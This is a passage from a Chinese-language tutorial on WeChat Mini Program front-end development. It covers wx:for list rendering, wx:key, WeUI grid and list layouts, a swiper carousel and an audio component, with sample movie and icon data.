控制属性绑定一个数组，即可使用数组中各项的数据重复渲染该组件。</p><p>默认数组的当前项的下标变量名默认为 <code>index</code>，数组当前项的变量名默认为 <code>item</code></p><p>使用 <code>wx:for-item</code> 可以指定数组当前元素的变量名，</p><p>使用 <code>wx:for-index</code> 可以指定数组当前下标的变量名：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">wx:for</span>=<span class="string">&quot;&#123;&#123;array&#125;&#125;&quot;</span> <span class="attr">wx:for-index</span>=<span class="string">&quot;idx&quot;</span> <span class="attr">wx:for-item</span>=<span class="string">&quot;itemName&quot;</span>&gt;</span></span><br><span class="line">  &#123;&#123;idx&#125;&#125;: &#123;&#123;itemName.message&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>wx:for</code> 也可以嵌套，下边是一个九九乘法表</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">wx:for</span>=<span class="string">&quot;&#123;&#123;[1, 2, 3, 4, 5, 6, 7, 8, 9]&#125;&#125;&quot;</span> <span class="attr">wx:for-item</span>=<span class="string">&quot;i&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">view</span> <span class="attr">wx:for</span>=<span class="string">&quot;&#123;&#123;[1, 2, 3, 4, 5, 6, 7, 8, 9]&#125;&#125;&quot;</span> <span class="attr">wx:for-item</span>=<span class="string">&quot;j&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">wx:if</span>=<span class="string">&quot;&#123;&#123;i &lt;= j&#125;&#125;&quot;</span>&gt;</span></span><br><span class="line">      &#123;&#123;i&#125;&#125; * &#123;&#123;j&#125;&#125; = &#123;&#123;i * j&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="0x003-block-wx-for"><a href="#0x003-block-wx-for" class="headerlink" title="0x003 block wx:for"></a>0x003 block wx:for</h3><p>类似 <code>block wx:if</code>，也可以将 <code>wx:for</code> 用在&#96;&#96;标签上，以渲染一个包含多节点的结构块。例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">block</span> <span class="attr">wx:for</span>=<span class="string">&quot;&#123;&#123;[1, 2, 3]&#125;&#125;&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">view</span>&gt;</span> &#123;&#123;index&#125;&#125;: <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">view</span>&gt;</span> &#123;&#123;item&#125;&#125; <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">block</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="0x004-wx-key"><a href="#0x004-wx-key" class="headerlink" title="0x004 wx:key"></a>0x004 wx:key</h3><p>如果列表中项目的位置会动态改变或者有新的项目添加到列表中，并且希望列表中的项目保持自己的特征和状态（如 <a href="https://developers.weixin.qq.com/miniprogram/dev/component/input.html">input</a> 中的输入内容，<a href="https://developers.weixin.qq.com/miniprogram/dev/component/switch.html">switch</a> 的选中状态），需要使用 <code>wx:key</code> 来指定列表中项目的唯一的标识符。</p><p><code>wx:key</code> 的值以两种形式提供</p><ol><li>字符串，代表在 for 循环的 array 中 item 的某个 property，该 property 的值需要是列表中唯一的字符串或数字，且不能动态改变。</li><li>保留关键字 <code>*this</code> 代表在 for 循环中的 item 本身，这种表示需要 item 本身是一个唯一的字符串或者数字。</li></ol><p>当数据改变触发渲染层重新渲染的时候，会校正带有 key 的组件，框架会确保他们被重新排序，而不是重新创建，以确保使组件保持自身的状态，并且提高列表渲染时的效率。</p><p><strong>如不提供 <code>wx:key</code>，会报一个 <code>warning</code>， 如果明确知道该列表是静态，或者不必关注其顺序，可以选择忽略。</strong></p><h3 id="0x005-电影列表页面"><a href="#0x005-电影列表页面" class="headerlink" title="0x005 电影列表页面"></a>0x005 电影列表页面</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">movies</span>: [&#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;肖申克的救赎&quot;</span>, </span><br><span class="line">    <span class="attr">img</span>:<span class="string">&quot;https://img3.doubanio.com/view/photo/s_ratio_poster/public/p480747492.webp&quot;</span>,</span><br><span class="line">    <span class="attr">desc</span>:<span class="string">&quot;有的人的羽翼是如此光辉，即使世界上最黑暗的牢狱，也无法长久地将他围困！&quot;</span>&#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&quot;霸王别姬&quot;</span>,</span><br><span class="line">      <span class="attr">img</span>: <span class="string">&quot;https://img3.doubanio.com/view/photo/s_ratio_poster/public/p1910813120.webp&quot;</span>,</span><br><span class="line">      <span class="attr">desc</span>: <span class="string">&quot;风华绝代。&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&quot;这个杀手不太冷&quot;</span>,</span><br><span class="line">      <span class="attr">img</span>: <span class="string">&quot;https://img3.doubanio.com/view/photo/s_ratio_poster/public/p511118051.webp&quot;</span>,</span><br><span class="line">      <span class="attr">desc</span>: <span class="string">&quot;怪蜀黍和小萝莉不得不说的故事。&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&quot;阿甘正传&quot;</span>,</span><br><span class="line">      <span class="attr">img</span>: <span class="string">&quot;https://img1.doubanio.com/view/photo/s_ratio_poster/public/p510876377.webp&quot;</span>,</span><br><span class="line">      <span class="attr">desc</span>: <span class="string">&quot;一部美国近现代史。&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&quot;美丽人生&quot;</span>,</span><br><span class="line">      <span class="attr">img</span>: <span class="string">&quot;https://img3.doubanio.com/view/photo/s_ratio_poster/public/p510861873.webp&quot;</span>,</span><br><span class="line">      <span class="attr">desc</span>: <span class="string">&quot;最美的谎言。&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&quot;泰坦尼克号&quot;</span>,</span><br><span class="line">      <span class="attr">img</span>: <span class="string">&quot;https://img3.doubanio.com/view/photo/s_ratio_poster/public/p457760035.webp&quot;</span>,</span><br><span class="line">      <span class="attr">desc</span>: <span class="string">&quot;失去的才是永恒的。&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&quot;千与千寻&quot;</span>,</span><br><span class="line">      <span class="attr">img</span>: <span class="string">&quot;https://img3.doubanio.com/view/photo/s_ratio_poster/public/p1606727862.webp&quot;</span>,</span><br><span class="line">      <span class="attr">desc</span>: <span class="string">&quot;最好的宫崎骏，最好的久石让。&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&quot;辛德勒名单&quot;</span>,</span><br><span class="line">      <span class="attr">img</span>: <span class="string">&quot;https://img3.doubanio.com/view/photo/s_ratio_poster/public/p492406163.webp&quot;</span>,</span><br><span class="line">      <span class="attr">desc</span>: <span class="string">&quot;拯救一个人，就是拯救整个世界。&quot;</span></span><br><span class="line">    &#125;,     </span><br><span class="line">  ],</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;page__bd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;weui-panel weui-panel_access&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;weui-panel__bd&quot;</span> <span class="attr">wx:for</span>=<span class="string">&quot;&#123;&#123;movies&#125;&#125;&quot;</span> <span class="attr">wx:for-item</span>=<span class="string">&quot;movies&quot;</span> <span class="attr">wx:key</span>=<span class="string">&quot;*item&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">navigator</span> <span class="attr">url</span>=<span class="string">&quot;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;weui-media-box weui-media-box_appmsg&quot;</span> <span class="attr">hover-class</span>=<span class="string">&quot;weui-cell_active&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;weui-media-box__hd weui-media-box__hd_in-appmsg&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;weui-media-box__thumb&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;&#123;&#123;movies.img&#125;&#125;&quot;</span> <span class="attr">sytle</span>=<span class="string">&quot;height:auto&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;weui-media-box__bd weui-media-box__bd_in-appmsg&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;weui-media-box__title&quot;</span>&gt;</span>&#123;&#123;movies.name&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;weui-media-box__desc&quot;</span>&gt;</span>&#123;&#123;movies.desc&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">navigator</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="0x006-Grid九宫格样式参考-适用于界面"><a href="#0x006-Grid九宫格样式参考-适用于界面" class="headerlink" title="0x006 Grid九宫格样式参考(适用于界面)"></a>0x006 Grid九宫格样式参考(适用于界面)</h3><p>一行三列式</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;page__bd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;weui-grids&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">block</span> <span class="attr">wx:for</span>=<span class="string">&quot;&#123;&#123;grids&#125;&#125;&quot;</span> <span class="attr">wx:for-item</span>=<span class="string">&quot;grid&quot;</span> <span class="attr">wx:key</span>=<span class="string">&quot;*this&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">navigator</span> <span class="attr">url</span>=<span class="string">&quot;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;weui-grid&quot;</span> <span class="attr">hover-class</span>=<span class="string">&quot;weui-grid_active&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;weui-grid__icon&quot;</span> <span class="attr">src</span>=<span class="string">&quot;&#123;&#123;grid.imgurl&#125;&#125;&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;weui-grid__label&quot;</span>&gt;</span>&#123;&#123;grid.title&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">navigator</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">block</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>&lt;block&gt;</code>的标签，这个标签主要是说明里面包含的是一个多节点的结构块，换成<code>&lt;view&gt;</code>组件也没有太大影响</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">grids</span>:[</span><br><span class="line">      &#123; <span class="attr">imgurl</span>:<span class="string">&quot;https://hackweek.oss-cn-shanghai.aliyuncs.com/hw18/hackwork/weapp/icon1.png&quot;</span>,</span><br><span class="line">        <span class="attr">title</span>:<span class="string">&quot;招聘&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">imgurl</span>: <span class="string">&quot;https://hackweek.oss-cn-shanghai.aliyuncs.com/hw18/hackwork/weapp/icon2.png&quot;</span>,</span><br><span class="line">        <span class="attr">title</span>: <span class="string">&quot;房产&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">imgurl</span>: <span class="string">&quot;https://hackweek.oss-cn-shanghai.aliyuncs.com/hw18/hackwork/weapp/icon3.png&quot;</span>,</span><br><span class="line">        <span class="attr">title</span>: <span class="string">&quot;二手车新车&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">imgurl</span>: <span class="string">&quot;https://hackweek.oss-cn-shanghai.aliyuncs.com/hw18/hackwork/weapp/icon4.png&quot;</span>,</span><br><span class="line">        <span class="attr">title</span>: <span class="string">&quot;二手&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">imgurl</span>: <span class="string">&quot;https://hackweek.oss-cn-shanghai.aliyuncs.com/hw18/hackwork/weapp/icon5.png&quot;</span>,</span><br><span class="line">        <span class="attr">title</span>: <span class="string">&quot;招商加盟&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">imgurl</span>: <span class="string">&quot;https://hackweek.oss-cn-shanghai.aliyuncs.com/hw18/hackwork/weapp/icon6.png&quot;</span>,</span><br><span class="line">        <span class="attr">title</span>: <span class="string">&quot;兼职&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">imgurl</span>: <span class="string">&quot;https://hackweek.oss-cn-shanghai.aliyuncs.com/hw18/hackwork/weapp/icon7.png&quot;</span>,</span><br><span class="line">        <span class="attr">title</span>: <span class="string">&quot;本地&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">imgurl</span>: <span class="string">&quot;https://hackweek.oss-cn-shanghai.aliyuncs.com/hw18/hackwork/weapp/icon8.png&quot;</span>,</span><br><span class="line">        <span class="attr">title</span>: <span class="string">&quot;家政&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">imgurl</span>: <span class="string">&quot;https://hackweek.oss-cn-shanghai.aliyuncs.com/hw18/hackwork/weapp/icon9.png&quot;</span>,</span><br><span class="line">        <span class="attr">title</span>: <span class="string">&quot;金币夺宝&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">imgurl</span>: <span class="string">&quot;https://hackweek.oss-cn-shanghai.aliyuncs.com/hw18/hackwork/weapp/icon10.png&quot;</span>,</span><br><span class="line">        <span class="attr">title</span>: <span class="string">&quot;送现金&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure><p>一行五列式</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.weui-grid</span>&#123;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">20%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x007-List样式参考-适用于个人中心"><a href="#0x007-List样式参考-适用于个人中心" class="headerlink" title="0x007 List样式参考(适用于个人中心)"></a>0x007 List样式参考(适用于个人中心)</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;weui-cells weui-cells_after-title&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">block</span> <span class="attr">wx:for</span>=<span class="string">&quot;&#123;&#123;listicons&#125;&#125;&quot;</span> <span class="attr">wx:for-item</span>=<span class="string">&quot;listicons&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">navigator</span> <span class="attr">url</span>=<span class="string">&quot;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;weui-cell weui-cell_access&quot;</span> <span class="attr">hover-class</span>=<span class="string">&quot;weui-cell_active&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;weui-cell__hd&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">image</span> <span class="attr">src</span>=<span class="string">&quot;&#123;&#123;listicons.icon&#125;&#125;&quot;</span> <span class="attr">style</span>=<span class="string">&quot;margin-right: 5px;vertical-align: middle;width:20px; height: 20px;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;weui-cell__bd&quot;</span>&gt;</span>&#123;&#123;listicons.title&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;weui-cell__ft weui-cell__ft_in-access&quot;</span>&gt;</span>&#123;&#123;listicons.desc&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">navigator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">block</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">listicons</span>:[&#123;</span><br><span class="line">      <span class="attr">icon</span>:<span class="string">&quot;https://hackweek.oss-cn-shanghai.aliyuncs.com/hw18/hackwork/weapp/listicons1.png&quot;</span>,</span><br><span class="line">      <span class="attr">title</span>:<span class="string">&quot;我的文件&quot;</span>,</span><br><span class="line">      <span class="attr">desc</span>:<span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">icon</span>:<span class="string">&quot;https://hackweek.oss-cn-shanghai.aliyuncs.com/hw18/hackwork/weapp/listicons2.png&quot;</span>,</span><br><span class="line">      <span class="attr">title</span>:<span class="string">&quot;我的收藏&quot;</span>,</span><br><span class="line">      <span class="attr">desc</span>:<span class="string">&quot;收藏列表&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">icon</span>:<span class="string">&quot;https://hackweek.oss-cn-shanghai.aliyuncs.com/hw18/hackwork/weapp/listicons3.png&quot;</span>,</span><br><span class="line">      <span class="attr">title</span>:<span class="string">&quot;我的邮件&quot;</span>,</span><br><span class="line">      <span class="attr">desc</span>:<span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    ],</span><br></pre></td></tr></table></figure><h2 id="0x07-小程序组件"><a href="#0x07-小程序组件" class="headerlink" title="0x07 小程序组件"></a>0x07 小程序组件</h2><h3 id="0x001-轮播效果"><a href="#0x001-轮播效果" class="headerlink" title="0x001 轮播效果"></a>0x001 轮播效果</h3><p>需要用到的轮播组件swiper</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;home-top&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;home-swiper&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">swiper</span> <span class="attr">indicator-dots</span>=<span class="string">&quot;&#123;&#123;indicatorDots&#125;&#125;&quot;</span> <span class="attr">autoplay</span>=<span class="string">&quot;&#123;&#123;autoplay&#125;&#125;&quot;</span> <span class="attr">interval</span>=<span class="string">&quot;&#123;&#123;interval&#125;&#125;&quot;</span> <span class="attr">duration</span>=<span class="string">&quot;&#123;&#123;duration&#125;&#125;&quot;</span> <span class="attr">indicator-color</span>=<span class="string">&quot;&#123;&#123;indicatorColor&#125;&#125;&quot;</span> <span class="attr">indicator-active-color</span>=<span class="string">&quot;&#123;&#123;activecolor&#125;&#125;&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">block</span> <span class="attr">wx:for</span>=<span class="string">&quot;&#123;&#123;imgUrls&#125;&#125;&quot;</span> <span class="attr">wx:key</span>=<span class="string">&quot;*this&quot;</span> &gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">swiper-item</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">image</span> <span class="attr">src</span>=<span class="string">&quot;&#123;&#123;item&#125;&#125;&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:100%;height:200px&quot;</span> <span class="attr">class</span>=<span class="string">&quot;slide-image&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span>  /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">swiper-item</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">block</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">swiper</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">imgUrls</span>: [</span><br><span class="line">  <span class="string">&#x27;https://images.unsplash.com/photo-1551334787-21e6bd3ab135?w=640&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;https://images.unsplash.com/photo-1551214012-84f95e060dee?w=640&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;https://images.unsplash.com/photo-1551446591-142875a901a1?w=640&#x27;</span></span><br><span class="line">],</span><br><span class="line"><span class="attr">interval</span>: <span class="number">5000</span>,</span><br><span class="line"><span class="attr">duration</span>: <span class="number">1000</span>,</span><br><span class="line"><span class="attr">indicatorDots</span>: <span class="literal">true</span>,</span><br><span class="line"><span class="attr">indicatorColor</span>: <span class="string">&quot;#ffffff&quot;</span>,</span><br><span class="line"><span class="attr">activecolor</span>:<span class="string">&quot;#2971f6&quot;</span>,</span><br><span class="line"><span class="attr">autoplay</span>: <span class="literal">true</span>,</span><br></pre></td></tr></table></figure><p>要构成一个完整的轮播需要满足：</p><p>1.配置<strong>相同尺寸规格的图片</strong></p><p>2.配置轮播时的面板指示点、动画效果、是否自动播放等</p><h3 id="0x002-audio组件-音乐列表"><a href="#0x002-audio组件-音乐列表" class="headerlink" title="0x002 audio组件(音乐列表)"></a>0x002 audio组件(音乐列表)</h3><p>audio组件是音频组件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">&quot;&#123;&#123;musicinfo.src&#125;&#125;&quot;</span> <span class="attr">poster</span>=<span class="string">&quot;&#123;&#123;musicinfo.poster&#125;&#125;&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&#123;&#123;musicinfo.name&#125;&#125;&quot;</span> <span class="attr">author</span>=<span class="string">&quot;&#123;&#123;musicinfo.author&#125;&#125;&quot;</span> <span class="attr">controls</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">musicinfo</span>: &#123;</span><br><span class="line">     <span class="attr">poster</span>: <span class="string">&#x27;http://y.gtimg.cn/music/photo_new/T002R300x300M000003rsKF44GyaSk.jpg?max_age=2592000&#x27;</span>,</span><br><span class="line">     <span class="attr">name</span>: <span class="string">&#x27;此时此刻&#x27;</span>,</span><br><span class="line">     <span class="attr">author</span>: <span class="string">&#x27;许巍&#x27;</span>,</span><br><span class="line">     <span class="attr">src</span>: <span class="string">&#x27;http://ws.stream.qqmusic.qq.com/M500001VfvsJ21xFqb.mp3?guid=ffffffff82def4af4b12b3cd9337d5e7&amp;uin=346897220&amp;vkey=6292F51E1E384E06DCBDC9AB7C49FD713D632D313AC4858BACB8DDD29067D3C601481D36E62053BF8DFEAF74C0A5CCFADD6471160CAF3E6A&amp;fromtag=46&#x27;</span>,</span><br><span class="line">  